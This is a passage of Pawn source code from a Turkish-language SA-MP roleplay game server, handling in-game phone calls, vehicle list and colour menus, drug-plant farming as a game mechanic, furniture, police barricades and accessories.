	//if(playertextid == fgh[playerid][31]) HidePlayerPhone(playerid);

	if(playertextid == qwe[playerid][23])
	{
		GetRehber(playerid);
		//ShowPlayerDialog(playerid, 102, DIALOG_STYLE_TABLIST_HEADERS, "Rehber",
	}
	if(playertextid == qwe[playerid][22])
	{
		ShowPlayerDialog(playerid, 138, DIALOG_STYLE_INPUT, "Telefon ~ Mesaj", "Göndermek istediðiniz mesajý giriniz.", "Rehber", "Numara");
	}
	if(playertextid == qwe[playerid][14])
	{
	    ShowPlayerDialog(playerid, 140, DIALOG_STYLE_INPUT, "Telefon ~ Arama", "Aramak istediðiniz numarayý giriniz.", "Ara", "Vazgeç");
	}

	if(playertextid == rty[playerid][10])
	{
	    foreach(new i : Player)
	    {
	        if(Arama[playerid][1] == Karakter[i][telno] && Arama[playerid][1] != 0)
	        {
	            Arama[i][0] = 0;
	            Arama[playerid][1] = 0;
    	    	Arama[playerid][2] = Karakter[i][telno];
    	    	Arama[i][2] = Karakter[playerid][telno];
				SetPlayerAttachedObject(playerid,INDEX_TELEFON,18865,6,0.096000,0.009000,-0.008000,75.399963,179.899902,0.000000,1.000000,1.000000,1.000000);
    	    	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
    	    	Bilgi(i, "Telefonunuz açýldý.");
    	    	OnPlayerCommandPerformed(playerid,"/ame telefonunu açarak kulaðýna dayar.",0);
	            break;
	        }
	    }
	}
	if(playertextid == rty[playerid][11])
	{
	    foreach(new i : Player)
        {
	        if(Arama[playerid][0] == Karakter[i][telno] || Arama[playerid][1] == Karakter[i][telno] || Arama[playerid][2] == Karakter[i][telno])
	        {
	            Arama[i][0] = 0;
	            Arama[i][1] = 0;
	            Arama[i][2] = 0;
	            Arama[i][3] = 0;
	            Arama[playerid][0] = 0;
	            Arama[playerid][1] = 0;
	            Arama[playerid][2] = 0;
	            Arama[playerid][3] = 0;
	            HidePlayerPhone(playerid);
	            HidePlayerPhone(i);
				RemovePlayerAttachedObject(playerid,INDEX_TELEFON);
    	    	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
				RemovePlayerAttachedObject(i,INDEX_TELEFON);
    	    	SetPlayerSpecialAction(i,SPECIAL_ACTION_STOPUSECELLPHONE);
    	    	OnPlayerCommandPerformed(playerid,"/ame telefonunu kapatarak cebine koyar.",0);
	            return 1;
	        }
	    }
		HidePlayerPhone(playerid);
	}
	if(playertextid == AracListeTD[playerid])
    {
		//new delikanli = AracListeAracD[playerid];
		/*if(Arac[delikanli][atip] != 5 && Arac[delikanli][aowner] == Karakter[playerid][sqlid])
		{
			if(Arac[delikanli][aspawn] == 0)
			{
			    SetVehicleVirtualWorld(delikanli, 0);
			    SetVehicleZAngle(delikanli, Arac[delikanli][aposa]);
			    Arac[delikanli][aspawn] = 1;
			    AracKaydet(delikanli);
			    new string[128];
				format(string, sizeof(string), "~w~ARACINIZ ~g~GETIRILDI");
				GameTextForPlayer(playerid, string, 2500, 4);
			}
		}*/
		CancelSelectTextDraw(playerid);
		PlayerTextDrawHide(playerid, AracListeTD[playerid]);
		PlayerTextDrawHide(playerid, AracListeTDYazi[playerid]);
		PlayerTextDrawHide(playerid, AracListeTDSag[playerid]);
		PlayerTextDrawHide(playerid, AracListeTDSol[playerid]);
		AracListeAracD[playerid] = 0;
    }
    if(playertextid == AracListeTDSag[playerid])
    {
        if(GetPVarInt(playerid, "AracListeSira") == AracSay(playerid)) return 1;
		new aracid = GetPVarInt(playerid, "AracListeAracDSonraki");
	    PlayerTextDrawSetPreviewModel(playerid, AracListeTD[playerid], GetVehicleModel(aracid));
	    PlayerTextDrawSetPreviewVehCol(playerid, AracListeTD[playerid], Arac[aracid][arenk1], Arac[aracid][arenk2]);
		PlayerTextDrawHide(playerid, AracListeTD[playerid]);
		PlayerTextDrawShow(playerid, AracListeTD[playerid]);
	  	new cizgiver[128], string[128];
	    format(cizgiver, sizeof(cizgiver), "_________");
	    strdel(cizgiver, 9-(strlen(VehicleName[GetVehicleModel(aracid)-400][0])/2), strlen(cizgiver));
	    format(string, sizeof(string), "%s%s", cizgiver, VehicleName[GetVehicleModel(aracid)-400][0]);
	    PlayerTextDrawSetString(playerid, AracListeTDYazi[playerid], string);
		new onceki = AracListeAracD[playerid];
		PlayerTextDrawSetPreviewModel(playerid, AracListeTDSol[playerid], GetVehicleModel(onceki));
		PlayerTextDrawSetPreviewVehCol(playerid, AracListeTDSol[playerid], Arac[onceki][arenk1], Arac[onceki][arenk2]);
		PlayerTextDrawShow(playerid, AracListeTDSol[playerid]);
	    SetPVarInt(playerid, "AracListeAracDOnceki", AracListeAracD[playerid]);
		AracListeAracD[playerid] = aracid;
		SetPVarInt(playerid, "AracListeSira", GetPVarInt(playerid, "AracListeSira")+1);
		if(GetPVarInt(playerid, "AracListeSira") < AracSay(playerid))
		{
			for(new am; am<MAX_VEHICLES; am++)
			{
				if(am > aracid)
				{
					if(Arac[am][aowner] == Karakter[playerid][sqlid] && IsValidVehicle(am))
					{
						PlayerTextDrawSetPreviewModel(playerid, AracListeTDSag[playerid], GetVehicleModel(am));
				  		PlayerTextDrawSetPreviewVehCol(playerid, AracListeTDSag[playerid], Arac[am][arenk1], Arac[am][arenk2]);
						PlayerTextDrawHide(playerid, AracListeTDSag[playerid]);
						PlayerTextDrawShow(playerid, AracListeTDSag[playerid]);
				  		SetPVarInt(playerid, "AracListeAracDSonraki", am);
						break;
					}
				 	continue;
				}
			}
		}
		else PlayerTextDrawHide(playerid, AracListeTDSag[playerid]);
    }

    if(playertextid == AracListeTDSol[playerid])
    {
        if(GetPVarInt(playerid, "AracListeSira") == 1) return 1;

		new aracid = GetPVarInt(playerid, "AracListeAracDOnceki");
	    PlayerTextDrawSetPreviewModel(playerid, AracListeTD[playerid], GetVehicleModel(aracid));
	    PlayerTextDrawSetPreviewVehCol(playerid, AracListeTD[playerid], Arac[aracid][arenk1], Arac[aracid][arenk2]);
		PlayerTextDrawHide(playerid, AracListeTD[playerid]);
		PlayerTextDrawShow(playerid, AracListeTD[playerid]);
	  	new cizgiver[128], string[128];
	    format(cizgiver, sizeof(cizgiver), "_________");
	    strdel(cizgiver, 9-(strlen(VehicleName[GetVehicleModel(aracid)-400][0])/2), strlen(cizgiver));
	    format(string, sizeof(string), "%s%s", cizgiver, VehicleName[GetVehicleModel(aracid)-400][0]);
	    PlayerTextDrawSetString(playerid, AracListeTDYazi[playerid], string);

		new onceki = AracListeAracD[playerid];
		PlayerTextDrawSetPreviewModel(playerid, AracListeTDSag[playerid], GetVehicleModel(onceki));
		PlayerTextDrawSetPreviewVehCol(playerid, AracListeTDSag[playerid], Arac[onceki][arenk1], Arac[onceki][arenk2]);
		PlayerTextDrawHide(playerid, AracListeTDSag[playerid]);
		PlayerTextDrawShow(playerid, AracListeTDSag[playerid]);

	    SetPVarInt(playerid, "AracListeAracDSonraki", AracListeAracD[playerid]);
		AracListeAracD[playerid] = aracid;

		SetPVarInt(playerid, "AracListeSira", GetPVarInt(playerid, "AracListeSira")-1);

		if(GetPVarInt(playerid, "AracListeSira") > 1)
		{
		    new oncekiam;
			for(new am; am<MAX_VEHICLES; am++)
			{
				if(Arac[am][aowner] == Karakter[playerid][sqlid] && IsValidVehicle(am))
				{
				    if(am != aracid) oncekiam = am;
				    else break;
				}
			}
			PlayerTextDrawSetPreviewModel(playerid, AracListeTDSol[playerid], GetVehicleModel(oncekiam));
	 		PlayerTextDrawSetPreviewVehCol(playerid, AracListeTDSol[playerid], Arac[oncekiam][arenk1], Arac[oncekiam][arenk2]);
			PlayerTextDrawHide(playerid, AracListeTDSol[playerid]);
			PlayerTextDrawShow(playerid, AracListeTDSol[playerid]);
 			SetPVarInt(playerid, "AracListeAracDOnceki", oncekiam);
		}
		else PlayerTextDrawHide(playerid, AracListeTDSol[playerid]);
    }
    return 1;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	if(Debug) printf("OnPlayerClickTextDraw(%d, -)", playerid);
	if(clickedid == Text:INVALID_TEXT_DRAW)
	{
	    if(AracListeAracD[playerid] != 0)
	    {
			PlayerTextDrawHide(playerid, AracListeTD[playerid]);
			PlayerTextDrawHide(playerid, AracListeTDYazi[playerid]);
			PlayerTextDrawHide(playerid, AracListeTDSol[playerid]);
			PlayerTextDrawHide(playerid, AracListeTDSag[playerid]);
			AracListeAracD[playerid] = 0;
		}
        return 1;
	}
	if (clickedid == ChangeColor[1] )
 	{
    	CancelSelectTextDraw(playerid);
        for(new i; i < sizeof(ChangeColor); i++)
		{
  			TextDrawHideForPlayer(playerid,ChangeColor[i]);
     	}
	}
    for(new i=2; i < sizeof(ChangeColor); i++)
    {
    	if(clickedid == ChangeColor[i])
        {
			if(renk1ayarliyo[playerid] == 1 || renk1ayarliyo[playerid] == 2 || renk1ayarliyo[playerid] == 3 || renk1ayarliyo[playerid] == 4 || renk1ayarliyo[playerid] == 5 || renk1ayarliyo[playerid] == 6)
			{
	        	CancelSelectTextDraw(playerid);
	        	if(GetPlayerCash(playerid) < 750) return Hata(playerid, "Yeterli paranýz yok.");
	        	if(renk1ayarliyo[playerid] == 1)
				{
					Arac[GetPlayerVehicleID(playerid)][arenk1] = ColorsAvailable[i-2];
					acol1[GetPlayerVehicleID(playerid)] = ColorsAvailable[i-2];
					GivePlayerCash(playerid, -750);
	        		//Arac[GetPlayerVehicleID(playerid)][arenk2] = ColorsAvailable[i-2];
	            	ChangeVehicleColor(GetPlayerVehicleID(playerid),Arac[GetPlayerVehicleID(playerid)][arenk1],Arac[GetPlayerVehicleID(playerid)][arenk2]);
	            	AracKaydet(GetPlayerVehicleID(playerid));
				}
	            for(new j; j < sizeof(ChangeColor); j++)
	            {
	            	TextDrawHideForPlayer(playerid,ChangeColor[j]);
	            }
	            if(renk1ayarliyo[playerid] == 2)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				    AracSatinalMenu(playerid);
				}
				if(renk1ayarliyo[playerid] == 3)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				    SSAracSatinalMenu(playerid);
				}
				if(renk1ayarliyo[playerid] == 4)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				    GaleriAracSatinalMenu(playerid);
				}
				if(renk1ayarliyo[playerid] == 5)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				   	HavaAracSatinalMenu(playerid);
				}
				if(renk1ayarliyo[playerid] == 6)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				    DenizAracSatinalMenu(playerid);
				}
	            renk1ayarliyo[playerid] = 0;
	            break;
			}
			else if(renk2ayarliyo[playerid] == 1 || renk2ayarliyo[playerid] == 2 || renk2ayarliyo[playerid] == 3 || renk2ayarliyo[playerid] == 4 || renk2ayarliyo[playerid] == 5 || renk2ayarliyo[playerid] == 6)
			{
	        	CancelSelectTextDraw(playerid);
	        	if(GetPlayerCash(playerid) < 750) return Hata(playerid, "Yeterli paranýz yok.");
	        	if(renk2ayarliyo[playerid] == 1)
	        	{
		        	//Arac[GetPlayerVehicleID(playerid)][arenk1] = ColorsAvailable[i-2];
		        	Arac[GetPlayerVehicleID(playerid)][arenk2] = ColorsAvailable[i-2];
		        	acol2[GetPlayerVehicleID(playerid)] = ColorsAvailable[i-2];
		        	GivePlayerCash(playerid, -750);
		            ChangeVehicleColor(GetPlayerVehicleID(playerid),Arac[GetPlayerVehicleID(playerid)][arenk1],Arac[GetPlayerVehicleID(playerid)][arenk2]);
		            AracKaydet(GetPlayerVehicleID(playerid));
				}
				for(new j; j < sizeof(ChangeColor); j++)
	            {
	            	TextDrawHideForPlayer(playerid,ChangeColor[j]);
	            }
	            if(renk2ayarliyo[playerid] == 2)
				{
				    SectigiAracRenk2[playerid] = ColorsAvailable[i-2];
				    AracSatinalMenu(playerid);
				}
				if(renk2ayarliyo[playerid] == 3)
				{
				    SectigiAracRenk2[playerid] = ColorsAvailable[i-2];
				    SSAracSatinalMenu(playerid);
				}
				if(renk2ayarliyo[playerid] == 4)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				    GaleriAracSatinalMenu(playerid);
				}
				if(renk2ayarliyo[playerid] == 5)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				    HavaAracSatinalMenu(playerid);
				}
				if(renk2ayarliyo[playerid] == 6)
				{
				    SectigiAracRenk1[playerid] = ColorsAvailable[i-2];
				   	DenizAracSatinalMenu(playerid);
				}
	            renk2ayarliyo[playerid] = 0;
	            break;
			}
		}
	}
	return 1;
}
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	if(Debug) printf("OnVehicleDamageStatusUpdate(%d, %d)",vehicleid, playerid);
	new panels, doors, lights, tires, Float:healph;
	GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
	Arac[vehicleid][apanels] = panels;
	Arac[vehicleid][adoors] = doors;
	Arac[vehicleid][alights] = lights;
	Arac[vehicleid][atires] = tires;
	GetVehicleHealth(vehicleid, healph);
	Arac[vehicleid][ahasar] = healph;
 	new Float:vHealth;
	GetVehicleHealth(vehicleid, vHealth);
	if(vHealth <= 400 && AMotorDurdur[vehicleid])
	{
		MotoruKapat(vehicleid);
		AMotorDurdur[vehicleid] = false;
		Ipucu(playerid, "Motor fazla hasar aldýðý için durmuþtur.");
	}
	return 1;
}
public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	if(Debug) printf("OnPlayerEditObject(%d, %d, %d, %d, %f, %f, %f, %f, %f, %f)",playerid, playerobject, objectid, response, fX, fY, fZ, fRotX, fRotY, fRotZ);
	return 1;
}
public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float:x, Float:y, Float:z)
{
	if(Debug) printf("OnPlayerSelectDynamicObject(%d, %d, %d, %f, %f, %f)",playerid, objectid, modelid, x, y, z);
	if(SelectObjectTur[playerid] == 1)
	{
		for(new i = 1; i < MAX_DRUGS; i++)
		{
		    if(objectid == Uyusturucu[i][uobje] && (modelid == 2203 || modelid == 2195))
		    {
		        if(Uyusturucu[i][utip] == 0)
			 	{
			 	    new _utext[10];
     				ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);
			 	    if(GetPVarInt(playerid, "TohumEkiyor") == 1)
				 	{
						Karakter[playerid][esrartohum]--;
						Uyusturucu[i][utip] = 1;
						_utext = "Esrar";
					}
					if(GetPVarInt(playerid, "TohumEkiyor") == 2)
				 	{
						Karakter[playerid][kokaintohum]--;
						Uyusturucu[i][utip] = 2;
						_utext = "Kokain";
					}
					if(GetPVarInt(playerid, "TohumEkiyor") == 3)
				 	{
						Karakter[playerid][erointohum]--;
						Uyusturucu[i][utip] = 3;
						_utext = "Eroin";
					}
					new mstring[24];
					format(mstring, sizeof(mstring), "%s\n0%",_utext);
			        DestroyDynamicObject(objectid);
			        Uyusturucu[i][uz] += 0.4;
		    		Uyusturucu[i][uobje] = CreateDynamicObject(2195, Uyusturucu[i][ux], Uyusturucu[i][uy], Uyusturucu[i][uz], 0.0, 0.0, 0.0, Uyusturucu[i][uvworld], Uyusturucu[i][uinterior]);
                    Uyusturucu[i][ulabel] = CreateDynamic3DTextLabel(mstring, COLOR_YELLOW,  Uyusturucu[i][ux], Uyusturucu[i][uy], Uyusturucu[i][uz], 5, .worldid=Uyusturucu[i][uvworld], .interiorid=Uyusturucu[i][uinterior]);
					UyusturucuKaydet(i);
				}
				else Hata(playerid, "Bu saksýya tohum ekemezsiniz.");
		        break;
		    }
		}
		CancelEdit(playerid);
		SelectObjectTur[playerid] = 0;
	}
	else if(SelectObjectTur[playerid] == 3)
	{
		for(new i = 1; i < MAX_DRUGS; i++)
		{
		    if(objectid == Uyusturucu[i][uobje] && (modelid == 2203 || modelid == 2195))
		    {
		        if(Uyusturucu[i][udurum] == 1)
			 	{
     				ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);


			 	    Uyusturucu[i][udurum] = 0;
			 	    Uyusturucu[i][udakika] = 0;
			 	    Uyusturucu[i][uz] -= 0.4;
			 	    DestroyDynamicObject(objectid);
		    		Uyusturucu[i][uobje] = CreateDynamicObject(2203, Uyusturucu[i][ux], Uyusturucu[i][uy], Uyusturucu[i][uz], 0.0, 0.0, 0.0, Uyusturucu[i][uvworld], Uyusturucu[i][uinterior]);
			 	    UyusturucuKaydet(i);

					new rand = random(5)+5,ver[128];
					if(Uyusturucu[i][utip] == 1) Karakter[playerid][uesrar] += rand,format(ver, sizeof(ver), "%d gram esrar topladýnýz.", rand);
                    if(Uyusturucu[i][utip] == 2) Karakter[playerid][kokain] += rand,format(ver, sizeof(ver), "%d gram kokain topladýnýz.", rand);
                    if(Uyusturucu[i][utip] == 3) Karakter[playerid][eroin] += rand,format(ver, sizeof(ver), "%d gram eroin topladýnýz.", rand);
                    DestroyDynamic3DTextLabel(Uyusturucu[i][ulabel]);
			 	    Bilgi(playerid, ver);
			 	    Uyusturucu[i][utip] = 0;
			 	}
			 	else if(Uyusturucu[i][udurum] == 2)
			 	{
     				ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);

			 	    Uyusturucu[i][udurum] = 0;
			 	    Uyusturucu[i][udakika] = 0;
			 	    Uyusturucu[i][utip] = 0;
			 	    Uyusturucu[i][uz] -= 0.4;
			 	    DestroyDynamicObject(objectid);
			 	    DestroyDynamic3DTextLabel(Uyusturucu[i][ulabel]);
		    		Uyusturucu[i][uobje] = CreateDynamicObject(2203, Uyusturucu[i][ux], Uyusturucu[i][uy], Uyusturucu[i][uz], 0.0, 0.0, 0.0, Uyusturucu[i][uvworld], Uyusturucu[i][uinterior]);
			 	    UyusturucuKaydet(i);

			 	    Bilgi(playerid, "Bu bitki kullanýlmaz halde.");
			 	}
			 	else if(Uyusturucu[i][udurum] == 0 && Uyusturucu[i][utip] != 0)
			 	{
					ShowPlayerDialog(playerid, 100, DIALOG_STYLE_MSGBOX, "Uyuþturucu Topla", "Bu bitki büyüme aþamasýnda. Toplamaya devam edilsin mi?", "Evet", "Vazgeç");
					SetPVarInt(playerid, "UyusturucuToplaID", i);
			 	}
			 	break;
			}
		}
	}
	else if(SelectObjectTur[playerid] == 4)
	{
		for(new i = 1; i < MAX_DRUGS; i++)
		{
		    if(objectid == Uyusturucu[i][uobje] && (modelid == 2203 || modelid == 2195))
		    {
		        if(Uyusturucu[i][udurum] == 3)
			 	{
     				ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);
			 	    Bilgi(playerid, "Bitkinin bakýmý yapýldý.");
			 	    Uyusturucu[i][udurum] = 0;
			 	    new mstring[20],_utext[10];
		            if(Uyusturucu[i][utip] == 1) _utext = "Esrar";
		            if(Uyusturucu[i][utip] == 2) _utext = "Kokain";
		            if(Uyusturucu[i][utip] == 3) _utext = "Eroin";
		            new _dk=Uyusturucu[i][udakika];
		            if(180 <= _dk <= 190)_dk=180;
		            if(_dk>190)_dk=0;
		            format(mstring, sizeof(mstring), "%s\n%d%",_utext,floatround((_dk*100)/180));
		            if(Uyusturucu[i][utip] != 0 && IsValidDynamic3DTextLabel(Uyusturucu[i][ulabel]))
					{
					    DestroyDynamic3DTextLabel(Uyusturucu[i][ulabel]);
						Uyusturucu[i][ulabel] = CreateDynamic3DTextLabel(mstring, COLOR_YELLOW,  Uyusturucu[i][ux], Uyusturucu[i][uy], Uyusturucu[i][uz], 5, .worldid=Uyusturucu[i][uvworld], .interiorid=Uyusturucu[i][uinterior]);
					}
				}
			 	else if(Uyusturucu[i][udurum] == 0)
			 	{
     				ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);

			 	    Bilgi(playerid, "Bu bitkinin tüm ihtiyaçlarý karþýlanmýþ.");
			 	}
			 	else if(Uyusturucu[i][udurum] == 1)
			 	{
     				ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);

			 	    Bilgi(playerid, "Bu bitki toplanmaya hazýr.");
			 	}
			 	else if(Uyusturucu[i][udurum] == 2)
			 	{
     				ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);

			 	    Bilgi(playerid, "Bu bitki çürümüþ.");
			 	}
			 	break;
			}
		}
	}
	else if(SelectObjectTur[playerid] == 5)
	{
		for(new i = 1; i < MAX_DRUGS; i++)
		{
		    if(objectid == Uyusturucu[i][uobje] && (modelid == 2203 || modelid == 2195))
		    {
		        UyusturucuSil(i);
			 	break;
			}
		}
	}
	else if(SelectObjectTur[playerid] == 6)
	{
		for(new i = 1; i < MAX_DRUGS; i++)
		{
		    if(objectid == Uyusturucu[i][uobje] && (modelid == 2203 || modelid == 2195))
		    {
		        if(Uyusturucu[i][utip] == 0)
		        {
			        UyusturucuSil(i);
			        Karakter[playerid][usaksi]++;
				}
			 	break;
			}
		}
	}
	else if(mobilyaci2[playerid] == 1)
	{
   		new mesafe = EvIceridenMesafesi(playerid);
        if(mesafe == 0) return Hata(playerid, "Evin içerisinde deðilsiniz.");
 		if(Ev[mesafe][esahip] != Karakter[playerid][sqlid] && Ev[mesafe][kiralayan] != Karakter[playerid][sqlid])
		{
		    Hata(playerid,"Evin sahibi veya kiracý deðilsiniz.");
		    mobilyaci2[playerid] = 0;
		    return 1;
  		}
  		for(new i;i<MAX_MOBILYA;i++)
  		{
  		    if(objectid == Mobilya[i][mobje])
  		    {
  		        mobilyaci3[playerid] = i;
  		        new mstring[64];
		  		format(mstring, sizeof(mstring), "MODELID\t{B3B3B3}%d\nTEXTURE\t{B3B3B3}%d - %d\nDüzenle\nKaldýr", modelid,Mobilya[mobilyaci3[playerid]][mtexture][0],Mobilya[mobilyaci3[playerid]][mtexture][1]);
		  		ShowPlayerDialog(playerid, 205, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Mobilya", mstring, "Seç", "Ýptal");
		  		mobilyaci[playerid] = objectid;
		  		CancelEdit(playerid);
		  		mobilyaci2[playerid] = 0;
  		        break;
			}
  		}
	}
	else if(GetPVarInt(playerid, "EsyaSeciyor") == 1)
	{
	    new mesafe = EvIceridenMesafesi(playerid);
        if(mesafe == 0) return Hata(playerid, "Evin içerisinde deðilsiniz.");
  		for(new i;i<MAX_MOBILYA;i++)
  		{
  		    if(objectid == Mobilya[i][mobje])
  		    {
  		        if(!IsPlayerInRangeOfPoint(playerid, 2.0, x, y, z)) return Hata(playerid, "Eþyanýn yanýnda deðilsiniz.");
  		        CancelEdit(playerid);
  		        SetPVarInt(playerid, "EsyaSeciyor", 0);
  		        DONDUR(playerid);
  		        ApplyAnimationEx(playerid,"CARRY", "LIFTUP",4.1,1,1,1,1,1);
  		        SetPVarInt(playerid, "EsyaTasiyor", 20);
  		        SetPVarInt(playerid, "EsyaTasiID", i);
  		        PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
	        	PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], "10");
	        	Bilgi(playerid, "Eþyayý paketliyorsunuz.");
  		        break;
			}
  		}
	}
	for(new i; i < MAX_BARIKAT;i++)
	{
	    if(Barikat[i][buniqueid])
	    {
	        if(Barikat[i][StreamerID] == objectid)
	        {
	            SetPVarInt(playerid, "DuzenleBarikat", i);
	            CancelEdit(playerid);
	            switch(GetPVarInt(playerid, "Barikat_IslemID"))
	            {
					case 0:
					{
						new str[256];
						format(str, 256, "\t\tPolis Barikatý\t\t\n\n\n\tOluþturan kiþi\t%s\n\tSon Düzenleyen\t%s",Barikat[i][OlusturanIsim],Barikat[i][DuzenleyenIsim]);
						ShowPlayerDialog(playerid, 1111, DIALOG_STYLE_MSGBOX, "Barikat Sistemi - Bilgi", str, "Kapat", "");
					}
	                case 1:
	                {
						Bilgi(playerid, "Barikatý düzenlemeye baþladýnýz.");
						SetPVarInt(playerid, "BarikatDuzenliyorum", 1);
                        EditDynamicObject(playerid, objectid);
	                }
	                case 2:
	                {
	                    ShowPlayerDialog(playerid, 3060, DIALOG_STYLE_MSGBOX, "Barikat Düzenle", "Barikatý silmek istediðinizden emin misiniz?", "Evet", "Hayýr");
	                }
	            }
	            break;
	        }
	    }
	}
    return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	if(Debug) printf("OnPlayerEditAttachedObject(%d, %d, %d, %d, %d, %f, %f, %f, %f, %f, %f, %f, %f, %f)",playerid, response, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
	if(response && GetPVarInt(playerid, "YelekDuzenliyor")) {
        //SetPlayerAttachedObject(playerid, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
        SetPVarInt(playerid, "YelekGiyiyor", 1);
		DeletePVar(playerid, "YelekDuzenliyor");
        Mesaj(playerid, BILGI_MESAJ, "Yeleði giydiniz.");
		new mstring[128];
		format(mstring, sizeof(mstring), "%f|%f|%f|%f|%f|%f|%f|%f|%f", fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
		UpdateYelekPos(playerid, mstring);
        return 1;
    }
	if(maskegiyiyor[playerid] == 1)
	{
		SetPlayerAttachedObject(playerid,index,modelid,boneid,fOffsetX,fOffsetY,fOffsetZ,fRotX,fRotY,fRotZ,fScaleX,fScaleY,fScaleZ);
		maskegiyiyor[playerid] = 0;
		return 1;
	}
	if(!response || aksEdit[playerid] == -1)
	{
		aksEdit[playerid] = -1;
		RemovePlayerAttachedObject(playerid,index);
		aksesuar[playerid][index][giyilmis] = false;
		return 1;
	}
	new aindex = aksEdit[playerid];
	Bilgi(playerid, "Aksesuarýnýzý düzenlediniz. Giymek için '/aksesuar giy' komutunu kullanabilirsiniz.");
	aksesuar[playerid][aindex][abone] = boneid;
	aksesuar[playerid][aindex][akX] = fOffsetX;
	aksesuar[playerid][aindex][akY] = fOffsetY;
	aksesuar[playerid][aindex][akZ] = fOffsetZ;
	aksesuar[playerid][aindex][arX] = fRotX;
	aksesuar[playerid][aindex][arY] = fRotY;
	aksesuar[playerid][aindex][arZ] = fRotZ;
	aksesuar[playerid][aindex][aoX] = fScaleX;
	aksesuar[playerid][aindex][aoY] = fScaleY;
	aksesuar[playerid][aindex][aoZ] = fScaleZ;
	aksesuar[playerid][aindex][giyilmis] = false;
	AksesuarGuncelle(playerid,aindex);
	RemovePlayerAttachedObject(playerid,aindex);
	aksEdit[playerid] = -1;
    return 1;
}
public OnQueryError(errorid, error[], callback[], query[], connectionHandle)
{
	if(Debug) printf("OnQueryError(%d, %s, %s, %s, %d)",errorid, error, callback, query, connectionHandle);
	printf("[MYSQL HATASI] errorid: %d - error %s - callback %s", errorid, error, callback);
	printf("query - %s", query);
	return 1;
}

//_____________________________________CALLBACKS________________________________
forward kamyonbitiyo(playerid);
public kamyonbitiyo(playerid)
{
	GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Devam Et", 5000, 3);
	TogglePlayerControllable(playerid, 1);
}
forward TedaviYapiliyo(playerid, oyuncuID);
public TedaviYapiliyo(playerid, oyuncuID)
{
	Bilgi(oyuncuID, "Tedaviyi tamamladýnýz.");
	Bilgi(playerid, "Tedavi süreciniz baþarýyla tamamlandý.");
	TogglePlayerControllable(playerid, 1);
	TogglePlayerControllable(oyuncuID, 1);
	SetPlayerWeather(playerid, 10);
	SetPlayerDrunkLevel(playerid, 0);
	Karakter[playerid][krizgeldimi] = 0;
	Karakter[playerid][bagimlimi] -= 10;
}
forward TedaviOl(playerid);
public TedaviOl(playerid)
{
	Bilgi(playerid, "Tedavi olma süreciniz baþarýyla tamamlandý.");
	TogglePlayerControllable(playerid, 1);
	GivePlayerCash(playerid, -100);
	SetPlayerHealth(playerid, 100);
	ResetDamages(playerid);
}
forward ShowGuns(playerid, targetid);
public ShowGuns(playerid, targetid)
{
	if(IsPlayerConnected(targetid))
	{
	    new string[128];
	    format(string, sizeof(string), ""C7"EIGHTBORN - "C8"Silah[%s]", OyuncuAdiniBul(targetid));
	    new mstring[512],_rtext[5];
	    new silahisim1[60];
	    foreach(new i : Guns)
		{
			if(OyuncuSilah[i][oyuncuid] == Karakter[targetid][sqlid])
			{
			    if(OyuncuSilah[i][durum] != 1) continue;
			    switch(OyuncuSilah[i][silahid])
				{
					case 0: silahisim1 = "Boþ";
			        case 1: silahisim1 = "Muþta (( /musta ))";
			        case 2: silahisim1 = "Golf Sopasý (( /golfsopasi ))";
			        case 3: silahisim1 = "Cop  (( /cop ))";
			        case 4: silahisim1 = "Býçak (( /bicak ))";
			        case 5: silahisim1 = "Beyzbol Sopasý (( /sopa ))";
			        case 6: silahisim1 = "Kürek (( /kurek ))";
			        case 7: silahisim1 = "Bilardo Sopasý (( /bsopasi ))";
			        case 8: silahisim1 = "Katana  (( /katana ))";
			        case 9: silahisim1 = "Testere (( /testere ))";
			        case 10: silahisim1 = "Mor Dildo (( /mdildo ))";
			        case 11: silahisim1 = "Küçük Beyaz Vibrator (( /kbvibra ))";
			        case 12: silahisim1 = "Büyük Beyaz Vibrator (( /bbvibra ))";
			        case 13: silahisim1 = "Gümüþ Vibrator (( /gumvibra ))";
			        case 14: silahisim1 = "Çiçek Demeti (( /cicek ))";
			        case 15: silahisim1 = "Baston (( /baston ))";
